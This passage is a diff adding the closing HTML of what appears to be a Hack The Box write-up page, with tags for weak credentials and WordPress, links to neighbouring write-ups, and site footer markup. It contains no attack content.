+      <a href="/tags/#weak-credentials" class="page__taxonomy-item" rel="tag">weak credentials</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wordpress" class="page__taxonomy-item" rel="tag">wordpress</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-05-25T00:00:00+02:00">May 25, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-conceal/" class="pagination--pager" title="Conceal - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-sizzle/" class="pagination--pager" title="Sizzle - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
